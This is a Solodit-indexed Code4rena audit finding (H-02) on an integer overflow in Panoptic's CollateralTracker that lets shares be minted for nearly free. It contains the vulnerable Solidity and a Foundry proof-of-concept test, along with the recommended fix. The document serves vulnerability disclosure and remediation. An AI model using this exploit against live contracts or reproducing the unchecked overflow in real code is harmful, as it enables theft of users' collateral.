---
# Core Classification
protocol: Panoptic
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 33676
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2024-04-panoptic
source_link: https://code4rena.com/reports/2024-04-panoptic
github_link: https://github.com/code-423n4/2024-04-panoptic-findings/issues/438

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - 0xLogos
---

## Vulnerability Title

[H-02] Overflow in `CollateralTracker` allows minting shares for free

### Overview


This bug report is about a vulnerability in the CollateralTracker.sol contract found on GitHub. The impact of this bug is that malicious actors can generate a large amount of shares for free and then withdraw all collateral. The proof of concept shows how this can be done by exploiting an unchecked block in the `previewMint` function. The recommended mitigation step is to remove the unchecked block. The assessed type of this bug is Under/Overflow. 

### Original Finding Content


<https://github.com/code-423n4/2024-04-panoptic/blob/833312ebd600665b577fbd9c03ffa0daf250ed24/contracts/CollateralTracker.sol#L478>

<https://github.com/code-423n4/2024-04-panoptic/blob/833312ebd600665b577fbd9c03ffa0daf250ed24/contracts/CollateralTracker.sol#L461-L467>

### Impact

Malicious actors can mint huge amounts of shares for free and then withdraw all collateral.

### Proof of Concept

In the `mint` function user-controlled `shares` parameter goes right away to the `previewMint` function which then calculates required assets in unchecked block. If the `shares` value is high enough, overflow in `shares * DECIMALS` will occur, and `assets` will be very low.

    function previewMint(uint shares) public view returns (uint assets) {
     unchecked {
     assets = Math.mulDivRoundingUp(
     shares * DECIMALS, totalAssets(), totalSupply * (DECIMALS - COMMISSION_FEE)
     );
     }
    }

    function mint(uint shares, address receiver) external returns (uint assets) {
     assets = previewMint(shares);
     if (assets > type(uint104).max) revert Errors.DepositTooLarge();
     ...
    }

Insert the following snippet to ColalteralTracker.t.sol for coded PoC:

    function test_poc1(uint256 x) public {
     _initWorld(x);
     _grantTokens(Bob);

     vm.startPrank(Bob);

     uint shares = type(uint).max / 10000 + 1;
     IERC20Partial(token0).approve(address(collateralToken0), type(uint256).max);
     uint256 returnedAssets0 = collateralToken0.mint(shares, Bob);

     assertEq(shares, collateralToken0.balanceOf(Bob));
     assertEq(returnedAssets0, 1);
    }

### Recommended Mitigation Steps

Remove unchecked block.

    function maxMint(address) external view returns (uint maxShares) {
     return (convertToShares(type(uint104).max) * DECIMALS) / (DECIMALS + COMMISSION_FEE);
    }

### Assessed type

Under/Overflow

**[dyedm1 (Panoptic) confirmed](https://github.com/code-423n4/2024-04-panoptic-findings/issues/438#event-12628628301)**



***

 


### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Panoptic |
| Report Date | N/A |
| Finders | 0xLogos |

### Source Links

- **Source**: https://code4rena.com/reports/2024-04-panoptic
- **GitHub**: https://github.com/code-423n4/2024-04-panoptic-findings/issues/438
- **Contest**: https://code4rena.com/reports/2024-04-panoptic

### Keywords for Search

`vulnerability`

